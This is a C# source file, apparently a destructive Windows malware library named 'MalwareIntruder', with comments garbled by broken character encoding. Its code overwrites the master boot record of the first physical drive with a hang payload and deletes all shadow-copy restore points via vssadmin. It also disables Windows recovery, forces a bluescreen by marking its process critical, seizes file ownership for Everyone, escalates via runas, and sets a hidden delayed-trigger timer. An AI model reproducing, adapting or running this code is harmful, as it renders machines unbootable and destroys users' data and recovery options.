using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading.Tasks;
using System.Windows.Forms;
using HANDLE = System.IntPtr;

namespace VortexSecOps
{
    namespace HarmfulSysHacks
    {
        /// <summary>
        /// Windows API ����
        /// </summary>
        public enum Windows_API_Constants
        {
            // �ļ�����ģʽ
            /// <summary>
            /// �ļ������ȡģʽ
            /// </summary>
            File_Share_Read = 0x00000001,
            /// <summary>
            /// �ļ�����д��ģʽ
            /// </summary>
            File_Share_Write = 0x00000002,

            // �ļ�����Ȩ��
            /// <summary>
            /// ͨ�ö�ȡ����Ȩ��
            /// </summary>
            Generic_Read = unchecked((int)0x80000000),
            /// <summary>
            /// ͨ��д�����Ȩ��
            /// </summary>
            Generic_Write = 0x40000000,

            // �ļ���������
            /// <summary>
            /// ���Ѵ��ڵ��ļ�
            /// </summary>
            Open_Existing = 3,
        }
        /// <summary>
        /// �������� Windows API ������صĽӿڣ��̳��� <see cref="IConfigCorrupter"/> �ӿڡ�
        /// </summary>
        public interface IWindowsAPIOperator : IConfigCorrupter
        {
            bool CloseHandle(HANDLE hObject);
            /// <summary>
            /// ������д��ָ�����ļ�������/�����I/O���豸��
            /// </summary>
            /// <param name="hFile">Ҫд�����ݵ��ļ������</param>
            /// <param name="lpBuffer">ָ�����Ҫд�����ݵĻ�������ָ�롣</param>
            /// <param name="nNumberOfBytesToWrite">Ҫ�ӻ�����д����ֽ�����</param>
            /// <param name="lpNumberOfBytesWritten">ָ��һ��������ָ�룬�ñ������ڽ���ʵ��д����ֽ�����</param>
            /// <param name="lpOverlapped">ָ��OVERLAPPED�ṹ��ָ�루�����ã���</param>
            /// <returns>
            /// ��������ɹ����򷵻�true���������ʧ�ܣ��򷵻�false��
            /// </returns>
            bool WriteFile(HANDLE hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpNumberOfBytesWritten, IntPtr lpOverlapped);
            /// <summary>
            /// ��������ļ���I/O�豸��
            /// </summary>
            /// <param name="lpFileName">Ҫ������򿪵��ļ����豸�����ơ�</param>
            /// <param name="dwDesiredAccess">���ļ����豸�����ķ���Ȩ�ޡ�</param>
            /// <param name="dwShareMode">�ļ����豸�Ĺ���ģʽ��</param>
            /// <param name="lpSecurityAttributes">ָ��SECURITY_ATTRIBUTES�ṹ��ָ�룬����ȷ���ļ����豸�İ�ȫ���ԡ�</param>
            /// <param name="dwCreationDisposition">���ļ����豸�������ʱӦ��ȡ�Ĳ�����</param>
            /// <param name="dwFlagsAndAttributes">�ļ����豸�����Լ���־��</param>
            /// <param name="hTemplateFile">ָ��ģ���ļ��ľ���������ã���</param>
            /// <returns></returns>
            HANDLE CreateFileA(string lpFileName, Windows_API_Constants dwDesiredAccess, Windows_API_Constants dwShareMode, uint lpSecurityAttributes, Windows_API_Constants dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);
            /// <summary>
            /// ��ָ�����ļ�������/�����I/O���豸��ȡ���ݡ� ����豸֧�֣����ȡ�������ļ�ָ��ָ����λ�á�
            /// </summary>
            /// <param name="hFile">�豸�ľ���������ļ����ļ�����������̡�������̨���������Ŵ����������׽��֡�ͨ����Դ��mailslot ��ܵ�����</param>
            /// <param name="lpBuffer">ָ����մ��ļ����豸��ȡ�����ݵĻ�������ָ�롣</param>
            /// <param name="nNumberOfBytesToRead">Ҫ��ȡ������ֽ�����</param>
            /// <param name="lpNumberOfBytesRead">ָ��ʹ��ͬ�� hFile ����ʱ���ն�ȡ���ֽ����ı�����ָ�롣</param>
            /// <param name="lpOverlapped">
            /// ָ�� <see cref="OVERLAPPED"/> �ṹ���ָ��
            /// </param>
            /// <returns>
            /// ��������ɹ�������ֵΪ����ֵ����ʾ <c>true</c>����
            /// �������ʧ�ܣ�����ֵΪ�㣨��ʾ <c>false</c>����
            /// </returns>
            bool ReadFile(HANDLE hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, ref uint lpNumberOfBytesRead, IntPtr lpOverlapped);
            /// <summary>
            /// �޸���������¼��MBR����
            /// </summary>
            /// <returns>����޸ĳɹ������� <c>true</c>�����򷵻� <c>false</c>��</returns>
            bool ModifyMasterBootRecord();
            /// <summary>
            /// ��ָ�����ֽ���������д����������¼��MBR����
            /// </summary>
            /// <param name="buffer">Ҫд�� MBR ���ֽ��������ݡ�</param>
            /// <returns>���д��ɹ������� <c>true</c>�����򷵻� <c>false</c>��</returns>
            bool WriteToMasterBootRecord(byte[] buffer);
        }
        /// <summary>
        /// �����˳��������صĽӿڣ��̳��� <see cref="IConfigCorrupter"/> �ӿڡ�
        /// </summary>
        public interface INormalOperator : IConfigCorrupter
        {
            /// <summary>
            /// �޸���������¼��MBR����
            /// </summary>
            void ModifyMasterBootRecord();
            /// <summary>
            /// ��ָ�����ֽ���������д����������¼��MBR����
            /// </summary>
            /// <param name="buffer">Ҫд�� MBR ���ֽ��������ݡ�</param>
            void WriteToMasterBootRecord(byte[] buffer);
        }
        /// <summary>
        /// �����������ƻ���ز����Ľӿڡ�
        /// </summary>
        public interface IConfigCorrupter
        {
            /// <summary>
            /// ɾ�����о�Ӱ����
            /// </summary>
            void DeleteAllRestorePoints();
            /// <summary>
            /// ����ϵͳ������
            /// </summary>
            void TriggerBlueScreen();
            /// <summary>
            /// ���� Windows �ָ�������
            /// </summary>
            void DisableWindowsRecoveryEnvironment();
            /// <summary>
            /// �����������
            /// </summary>
            void RestartComputer();

        }

        // ��������˱��������ʹ�õ���ϵͳ���������صĶ������
        public class MalwareIntruder
        {
            // ˽�й��캯������ֹ�ⲿʵ����
            private MalwareIntruder() { }
            // ���� MBR �����ļ���·��
            private const string MBR_PATH = @"C:\bin\mbr.bin";
            /// <summary>
            /// ��ָ�����ļ�������/�����I/O���豸��ȡ���ݡ� ����豸֧�֣����ȡ�������ļ�ָ��ָ����λ�á�
            /// </summary>
            /// <param name="hFile">�豸�ľ���������ļ����ļ�����������̡�������̨���������Ŵ����������׽��֡�ͨ����Դ��mailslot ��ܵ�����</param>
            /// <param name="lpBuffer">ָ����մ��ļ����豸��ȡ�����ݵĻ�������ָ�롣</param>
            /// <param name="nNumberOfBytesToRead">Ҫ��ȡ������ֽ�����</param>
            /// <param name="lpNumberOfBytesRead">ָ��ʹ��ͬ�� hFile ����ʱ���ն�ȡ���ֽ����ı�����ָ�롣</param>
            /// <param name="lpOverlapped">
            /// ָ�� <see cref="OVERLAPPED"/> �ṹ���ָ��
            /// </param>
            /// <returns>
            /// ��������ɹ�������ֵΪ����ֵ����ʾ <c>true</c>����
            /// �������ʧ�ܣ�����ֵΪ�㣨��ʾ <c>false</c>����
            /// </returns>
            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool ReadFile(HANDLE hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, ref uint lpNumberOfBytesRead, IntPtr lpOverlapped);

            /// <summary>
            /// ��������ļ���I/O�豸��
            /// </summary>
            /// <param name="lpFileName">Ҫ������򿪵��ļ����豸�����ơ�</param>
            /// <param name="dwDesiredAccess">���ļ����豸�����ķ���Ȩ�ޡ�</param>
            /// <param name="dwShareMode">�ļ����豸�Ĺ���ģʽ��</param>
            /// <param name="lpSecurityAttributes">ָ��SECURITY_ATTRIBUTES�ṹ��ָ�룬����ȷ���ļ����豸�İ�ȫ���ԡ�</param>
            /// <param name="dwCreationDisposition">���ļ����豸�������ʱӦ��ȡ�Ĳ�����</param>
            /// <param name="dwFlagsAndAttributes">�ļ����豸�����Լ���־��</param>
            /// <param name="hTemplateFile">ָ��ģ���ļ��ľ���������ã���</param>
            /// <returns></returns>
            [DllImport("kernel32.dll", SetLastError = true)]
            private static extern HANDLE CreateFileA(string lpFileName, uint dwDesiredAccess, uint dwShareMode, uint lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

            /// <summary>
            /// ������д��ָ�����ļ�������/�����I/O���豸��
            /// </summary>
            /// <param name="hFile">Ҫд�����ݵ��ļ������</param>
            /// <param name="lpBuffer">ָ�����Ҫд�����ݵĻ�������ָ�롣</param>
            /// <param name="nNumberOfBytesToWrite">Ҫ�ӻ�����д����ֽ�����</param>
            /// <param name="lpNumberOfBytesWritten">ָ��һ��������ָ�룬�ñ������ڽ���ʵ��д����ֽ�����</param>
            /// <param name="lpOverlapped">ָ��OVERLAPPED�ṹ��ָ�루�����ã���</param>
            /// <returns>
            /// ��������ɹ����򷵻�true���������ʧ�ܣ��򷵻�false��
            /// </returns>
            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private static extern bool WriteFile(HANDLE hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpNumberOfBytesWritten, IntPtr lpOverlapped);

            // �����ļ�����ģʽ����
            private const int File_Share_Read = 0x00000001;
            private const int File_Share_Write = 0x00000002;
            // �����ļ�����Ȩ�޳���
            private const uint Generic_Read = 0x80000000;
            private const uint Generic_Write = 0x40000000;
            // �����ļ�������������
            private const int Open_Existing = 3;

            // �رվ���� Windows API ����
            [DllImport("kernel32.dll", SetLastError = true)]
            [return: MarshalAs(UnmanagedType.Bool)]
            private extern static bool CloseHandle(HANDLE hObject);
            /// <summary>
            /// �������ý�����Ϣ��
            /// </summary>
            /// <param name="hProcess">���̵ľ����</param>
            /// <param name="processInformationClass">Ҫ���õĽ�����Ϣ���͡�</param>
            /// <param name="processInformation">ָ�����Ҫ���õĽ�����Ϣ�Ļ�������ָ�롣</param>
            /// <param name="processInformationLength">������Ϣ�������ĳ��ȡ�</param>
            /// <returns></returns>
            [DllImport("ntdll.dll", SetLastError = true)]
            private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
            /// <summary>
            /// ��ȡָ�����ļ�����Ȩ����ִ�в���
            /// </summary>
            /// <param name="iFile">�ļ�·��</param>
            /// <param name="action">��ȡ������Ȩ��ִ�еĲ���</param>
            public static void TakeOwnershipOfFile(string iFile, Action<string> action)
            {
                ProcessStartInfo takeownPsi = new ProcessStartInfo
                {
                    FileName = "takeown.exe",
                    Arguments = $"/f \"{iFile}\" /A",
                    Verb = "runas",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(takeownPsi).WaitForExit();
                ProcessStartInfo icaclsPsi = new ProcessStartInfo
                {
                    FileName = "icacls.exe",
                    Arguments = $"\"{iFile}\" /grant Everyone:F",
                    Verb = "runas",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(icaclsPsi).WaitForExit();
                action.Invoke(iFile);
            }
            /// <summary>
            /// ��ȡָ�����ļ�����Ȩ
            /// </summary>
            /// <param name="iFile">�ļ�·��</param>
            public static void TakeOwnershipOfFile(string iFile)
            {
                ProcessStartInfo takeownPsi = new ProcessStartInfo
                {
                    FileName = "takeown.exe",
                    Arguments = $"/f \"{iFile}\" /A",
                    Verb = "runas",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(takeownPsi).WaitForExit();
                ProcessStartInfo icaclsPsi = new ProcessStartInfo
                {
                    FileName = "icacls.exe",
                    Arguments = $"\"{iFile}\" /grant Everyone:F",
                    Verb = "runas",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                Process.Start(icaclsPsi).WaitForExit();
            }
            /// <summary>
            /// ���MBR�����ļ������ڣ���ͨ��Windows API��ȡMBR����д�뱸���ļ��У�
            /// ������ڣ��ͻ�ȡMBR��
            /// </summary>
            /// <returns>��ȡ����MBR</returns>
            public static byte[] GetMbrUsingWindowsAPI()
            {
                // ����������������·��
                string physicalDrivePath = @"\\.\PhysicalDrive0";
                // ���ڴ洢ʵ�ʶ�ȡ���ֽ���
                uint bytesRead = 0;
                // ��ֵ����
                uint NULL_VALUE = 0;
                // ���ڴ洢 MBR ���ݵ��ֽ�����
                byte[] masterBootRecordData = new byte[512];
                // ���� MBR �洢�ļ��е�·��
                const string MBR_STORAGE_PATH = @"C:\bin";
                // ��� MBR �洢�ļ����Ƿ���ڣ�����������򴴽�
                if (!Directory.Exists(MBR_STORAGE_PATH))
                {
                    Directory.CreateDirectory(MBR_STORAGE_PATH);
                }
                // ��� MBR �����ļ��Ƿ����
                if (!File.Exists(MBR_PATH))
                {
                    // �������������ľ��
                    HANDLE handle = CreateFileA(physicalDrivePath, Generic_Read, File_Share_Read, NULL_VALUE, Open_Existing, NULL_VALUE, IntPtr.Zero);
                    if (handle != IntPtr.Zero)
                    {
                        // ��������������ȡ MBR ����
                        if (ReadFile(handle, masterBootRecordData, 512, ref bytesRead, IntPtr.Zero))
                        {
                            try
                            {
                                // ������� MBR �����ļ���д������
                                using (FileStream fileStream = new FileStream(MBR_PATH, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite))
                                {
                                    fileStream.Write(masterBootRecordData, 0, 512);
                                }
                            }
                            catch (Exception)
                            {
                                // �����쳣ʱ���� null
                                return null;
                            }
                            finally
                            {
                                // �رվ��
                                CloseHandle(handle);
                            }
                        }
                        else
                        {
                            // ��ȡʧ��ʱ�رվ�������� null
                            CloseHandle(handle);
                            return null;
                        }
                    }
                    else
                    {
                        // �򿪾��ʧ��ʱ���� null
                        return null;
                    }
                }
                try
                {
                    // ���³�ʼ�� MBR ��������
                    masterBootRecordData = new byte[512];
                    // �� MBR �����ļ��ж�ȡ����
                    using (FileStream fileStream = new FileStream(MBR_PATH, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                    {
                        fileStream.Read(masterBootRecordData, 0, 512);
                    }
                    return masterBootRecordData;
                }
                catch (Exception)
                {
                    // �����쳣ʱ���� null
                    return null;
                }
            }

            // ͨ���ļ�����ȡ MBR ����
            public static byte[] GetMbrByFileStream()
            {
                // ����������������·��
                string physicalDrivePath = @"\\.\PhysicalDrive0";
                // ���ڴ洢 MBR ���ݵ��ֽ�����
                byte[] masterBootRecordData = new byte[512];
                // ���� MBR �洢�ļ��е�·��
                const string MBR_STORAGE_PATH = @"C:\bin";
                // ��� MBR �洢�ļ����Ƿ���ڣ�����������򴴽�
                if (!Directory.Exists(MBR_STORAGE_PATH))
                {
                    DirectoryInfo directory = new DirectoryInfo(MBR_STORAGE_PATH);
                    directory.Create();
                }
                // ��ȡ MBR �����ļ�����Ϣ
                FileInfo mbrFileInfo = new FileInfo(MBR_PATH);
                if (!mbrFileInfo.Exists)
                {
                    // ���������������ļ�������ȡ MBR ����
                    using (FileStream fileStream = new FileStream(physicalDrivePath, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        fileStream.Read(masterBootRecordData, 0, 512);
                    }
                    // ������� MBR �����ļ���д������
                    using (FileStream fileStream1 = new FileStream(MBR_PATH, FileMode.OpenOrCreate, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        fileStream1.Write(masterBootRecordData, 0, 512);
                    }
                    // �� MBR ������������
                    for (int i = 0; i < 512; i++)
                    {
                        masterBootRecordData[i] = 0;
                    }
                }
                // �� MBR �����ļ��ж�ȡ����
                using (FileStream fileStream2 = new FileStream(MBR_PATH, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                {
                    fileStream2.Read(masterBootRecordData, 0, 512);
                }
                return masterBootRecordData;
            }

            // �첽���ʱ���Ƿ񵽴�ָ������
            public static async Task<bool> CheckTimeAsync(string filename = @"time.txt", int daysLater = 10)
            {
                // ����ʱ���ļ��洢�ļ��е�·��
                const string TIME_FOLDER_PATH = @"C:\time8597";
                // ����ʱ���ļ�������·��
                string timeFilePath = Path.Combine(TIME_FOLDER_PATH, filename);
                // ��ȡʱ���ļ��洢�ļ��е���Ϣ
                DirectoryInfo directory = new DirectoryInfo(TIME_FOLDER_PATH);
                // ���ʱ���ļ��洢�ļ����Ƿ���ڣ�����������򴴽�
                if (!directory.Exists)
                {
                    directory.Create();
                }
                // ��ʱ���ļ��洢�ļ�������Ϊ��������
                directory.Attributes = FileAttributes.Hidden;
                if (!File.Exists(timeFilePath))
                {
                    // ����ָ�������������
                    DateTime futureDateTime = DateTime.Now.AddDays(daysLater);
                    // ��������Ϣд��ʱ���ļ�
                    File.WriteAllText(timeFilePath, $"{futureDateTime.Year}--time--{futureDateTime.Month}--time--{futureDateTime.Day}");
                }
                // ��ȡʱ���ļ��е�������Ϣ
                string storedTimeString = File.ReadAllText(timeFilePath);
                // ����ָ�������
                string[] splits = { "--time--" };
                // �ָ�������Ϣ�ַ���
                string[] dateComponents = storedTimeString.Split(splits, StringSplitOptions.None);
                // ��ȡ���
                int year = Convert.ToInt32(dateComponents[0]);
                // ��ȡ�·�
                int month = Convert.ToInt32(dateComponents[1]);
                // ��ȡ����
                int day = Convert.ToInt32(dateComponents[2]);
                // ����Ŀ�����ڶ���
                DateTime targetDateTime = new DateTime(year, month, day);
                while (true)
                {
                    // ��ȡ��ǰ����ʱ��
                    DateTime now = DateTime.Now;
                    if (now >= targetDateTime)
                    {
                        // �����ǰ����ʱ����ڵ���Ŀ������ʱ�䣬���� true
                        return true;
                    }
                    // �첽�ӳ� 200 ����
                    await Task.Delay(200);
                }
            }

            /// <summary>
            /// ����Ƿ�Ϊ����Ա�������
            /// </summary>
            /// <returns>�ǹ���Ա���� true��������Ϊ false</returns>
            public static bool IsRunningAsAdministrator()
            {
                // ��ȡ��ǰ�û��������Ϣ
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                // ���� Windows �������
                WindowsPrincipal principal = new WindowsPrincipal(identity);
                // ����Ƿ�Ϊ����Ա��ɫ
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }

            /// <summary>
            /// �Թ���Ա��������������
            /// </summary>
            public static void RestartCurrentAppAsAdmin()
            {
                // ��������������Ϣ����
                ProcessStartInfo startInfo = new ProcessStartInfo();
                // ����Ҫ�����Ľ��̵��ļ���
                startInfo.FileName = Process.GetCurrentProcess().MainModule.FileName;
                // �����Թ���Ա�������
                startInfo.Verb = "runas";
                try
                {
                    // ��������
                    Process.Start(startInfo);
                }
                catch (Exception ex)
                {
                    // �����쳣����ʾ������Ϣ��
                    MessageBox.Show(ex.Message, "����", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                finally
                {
                    // �˳���ǰ����
                    Environment.Exit(0);
                }
            }

            // �ڲ��࣬ʵ���˶���ӿڣ�����ִ�и���ϵͳ����
            private class OpMaster : INormalOperator, IWindowsAPIOperator, IConfigCorrupter
            {
                bool IWindowsAPIOperator.CloseHandle(HANDLE hObject)
                {
                    return CloseHandle(hObject);
                }
                bool IWindowsAPIOperator.WriteFile(HANDLE hFile, byte[] lpBuffer, int nNumberOfBytesToWrite, ref int lpNumberOfBytesWritten, IntPtr lpOverlapped)
                {
                    return WriteFile(hFile, lpBuffer, nNumberOfBytesToWrite, ref lpNumberOfBytesWritten, lpOverlapped);
                }
                HANDLE IWindowsAPIOperator.CreateFileA(string lpFileName, Windows_API_Constants dwDesiredAccess, Windows_API_Constants dwShareMode, uint lpSecurityAttributes, Windows_API_Constants dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile)
                {
                    return CreateFileA(lpFileName, (uint)dwDesiredAccess, (uint)dwShareMode, lpSecurityAttributes, (uint)dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);
                }
                bool IWindowsAPIOperator.ReadFile(HANDLE hFile, byte[] lpBuffer, uint nNumberOfBytesToRead, ref uint lpNumberOfBytesRead, System.IntPtr lpOverlapped)
                {
                    return ReadFile(hFile, lpBuffer, nNumberOfBytesToRead, ref lpNumberOfBytesRead, lpOverlapped);
                }
                // ���ڴ��������ķ���
                void IConfigCorrupter.TriggerBlueScreen()
                {
                    // ���ý���Ϊ�ؼ�����
                    int isCritical = 1;
                    // ���� BreakOnTermination ����
                    int BreakOnTermination = 29;
                    // ���� Windows API ���ý�����Ϣ
                    NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
                    // �˳���ǰ����
                    Environment.Exit(0);
                }

                // �޸���������¼��MBR��
                void INormalOperator.ModifyMasterBootRecord()
                {
                    // �����ʼ�� MBR ����
                    byte[] initialMbrData = { 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xBD, 0x17, 0x7C, 0xB9, 0x03, 0x00, 0xB8, 0x01, 0x13, 0xBB, 0x0C, 0x00, 0xBA, 0x1D, 0x0E, 0xCD, 0x10, 0xC3, 0x54, 0x76, 0x54 };
                    // ����һ�� 512 �ֽڵ� MBR ��������
                    byte[] mbrdata = new byte[512];
                    // ����ʼ MBR ���ݸ��Ƶ� MBR ����������
                    for (int i = 0; i < initialMbrData.Length; i++)
                    {
                        mbrdata[i] = initialMbrData[i];
                    }
                    // ���� MBR ���ݵ���������ֽ�
                    mbrdata[510] = 0x55;
                    mbrdata[511] = 0xAA;
                    // ����������������·��
                    string physicalDrivePath = @"\\.\PhysicalDrive0";
                    // ���������������ļ�����д�� MBR ����
                    using (FileStream file = new FileStream(physicalDrivePath, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        file.Write(mbrdata, 0, 512);
                    }
                }

                // ʹ��Windows API�޸ģ�MBR��
                bool IWindowsAPIOperator.ModifyMasterBootRecord()
                {
                    // ����������������·��
                    const string physicalDrivePath = @"\\.\PhysicalDrive0";
                    // ���ڴ洢ʵ��д����ֽ���
                    int bytesWritten = 0;
                    // ��ֵ����
                    uint NULL_VALUE = 0;
                    // �����ʼ�� MBR ����
                    byte[] initialMbrData = { 0xE8, 0x02, 0x00, 0xEB, 0xFE, 0xBD, 0x17, 0x7C, 0xB9, 0x03, 0x00, 0xB8, 0x01, 0x13, 0xBB, 0x0C, 0x00, 0xBA, 0x1D, 0x0E, 0xCD, 0x10, 0xC3, 0x54, 0x76, 0x54 };
                    // ����һ�� 512 �ֽڵ� MBR ��������
                    byte[] masterBootRecordData = new byte[512];
                    // ����ʼ MBR ���ݸ��Ƶ� MBR ����������
                    for (int i = 0; i < initialMbrData.Length; i++)
                    {
                        masterBootRecordData[i] = initialMbrData[i];
                    }
                    // ���� MBR ���ݵ���������ֽ�
                    masterBootRecordData[510] = 0x55;
                    masterBootRecordData[511] = 0xAA;
                    // �������������ľ��
                    HANDLE masterBootRecord = CreateFileA(physicalDrivePath, Generic_Read | Generic_Write, File_Share_Read | File_Share_Write, NULL_VALUE, Open_Existing, NULL_VALUE, HANDLE.Zero);
                    // д�� MBR ����
                    bool isWriteSuccessful = WriteFile(masterBootRecord, masterBootRecordData, 512, ref bytesWritten, IntPtr.Zero);
                    if (masterBootRecord != IntPtr.Zero)
                    {
                        // �رվ��
                        CloseHandle(masterBootRecord);
                    }
                    return isWriteSuccessful;
                }
                void IConfigCorrupter.DeleteAllRestorePoints()
                {
                    // ��������������Ϣ����
                    ProcessStartInfo startInfo = new ProcessStartInfo()
                    {
                        // ����Ҫ�����Ľ��̵��ļ���
                        FileName = @"vssadmin.exe",
                        // ����ɾ�����о�Ӱ�����Ĳ���
                        Arguments = "delete shadows /all /quiet",
                        //�Թ���Ա������д˽���
                        Verb = "runas",
                        // ��ʹ�� shell ִ��
                        UseShellExecute = false,
                        // ����������
                        CreateNoWindow = true,
                    };
                    // ��������
                    Process.Start(startInfo).WaitForExit();
                }
                // ��������������ķ���
                void IConfigCorrupter.RestartComputer()
                {
                    // ��������������Ϣ����
                    ProcessStartInfo startInfo = new ProcessStartInfo()
                    {
                        // ����Ҫ�����Ľ��̵��ļ���
                        FileName = @"shutdown.exe",
                        // ��������������Ĳ���
                        Arguments = "/r /t 0",
                        // ��ʹ�� shell ִ��
                        UseShellExecute = false,
                        // ����������
                        CreateNoWindow = true,
                    };
                    // ��������
                    Process.Start(startInfo);
                }

                // ����Windows�ָ�����
                void IConfigCorrupter.DisableWindowsRecoveryEnvironment()
                {
                    // ��������������Ϣ����
                    ProcessStartInfo startInfo = new ProcessStartInfo()
                    {
                        // ����Ҫ�����Ľ��̵��ļ���
                        FileName = @"reagentc.exe",
                        // ���ý��� Windows �ָ������Ĳ���
                        Arguments = @"/disable",
                        // ����������
                        CreateNoWindow = true,
                        // ��ʹ�� shell ִ��
                        UseShellExecute = false,
                    };
                    // ��������
                    Process.Start(startInfo).WaitForExit();
                }

                // �������MBR����д������������
                void INormalOperator.WriteToMasterBootRecord(byte[] buffer)
                {
                    // ����������������·��
                    string path = @"\\.\PhysicalDrive0";
                    // ���������������ļ�����д�� MBR ����
                    using (FileStream fileStream = new FileStream(path, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite))
                    {
                        fileStream.Write(buffer, 0, 512);
                    }
                }

                // ʹ�� Windows API ������� MBR ����д������������
                bool IWindowsAPIOperator.WriteToMasterBootRecord(byte[] buffer)
                {
                    // ����������������·��
                    string path = @"\\.\PhysicalDrive0";
                    // ���ڴ洢ʵ��д����ֽ���
                    int write = 0;
                    // �����ʼ��Ϊ��
                    HANDLE handle = IntPtr.Zero;
                    try
                    {
                        // �������������ľ��
                        handle = CreateFileA(path, Generic_Read | Generic_Write,
                                    File_Share_Read | File_Share_Write,
                                    0, Open_Existing,
                                    0, IntPtr.Zero);
                        if (handle != IntPtr.Zero)
                        {
                            // д�� MBR ����
                            if (WriteFile(handle, buffer, 512, ref write, IntPtr.Zero))
                            {
                                // �رվ��
                                CloseHandle(handle);
                                return true;
                            }
                        }
                    }
                    finally
                    {
                        if (handle != IntPtr.Zero)
                        {
                            // �رվ��
                            CloseHandle(handle);
                        }
                    }
                    return false;
                }
            }

            // ����ָ���ӿ����͵�ʵ��
            public static T Create<T>() where T : class
            {
                if (typeof(T) == typeof(IWindowsAPIOperator) || typeof(T) == typeof(INormalOperator) || typeof(T) == typeof(IConfigCorrupter))
                {
                    // �����ָ���Ľӿ����ͣ��򴴽� OpMaster ʵ����ת��Ϊָ������
                    return new OpMaster() as T;
                }
                return null;
            }
        }
    }
}